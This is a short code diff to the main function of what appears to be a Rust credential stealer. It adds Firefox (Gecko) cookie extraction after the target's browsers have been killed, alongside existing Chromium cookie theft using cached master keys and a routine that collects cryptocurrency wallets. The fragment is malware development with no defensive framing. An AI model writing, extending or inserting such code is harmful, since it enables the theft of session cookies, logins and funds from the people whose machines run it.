@@ -157,6 +157,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Browsers are closed — retry cookie extraction with cached master keys.
     let cookie_retry = browsers::chromium::extract_cookies_post_kill();
     browsers::merge_files(&mut all_files, cookie_retry);
+    let gecko_cookie_retry = browsers::gecko::extract_cookies_post_kill();
+    browsers::merge_files(&mut all_files, gecko_cookie_retry);
 
     let wallet_files = wallet::collect_wallets();
     for (name, content) in wallet_files {
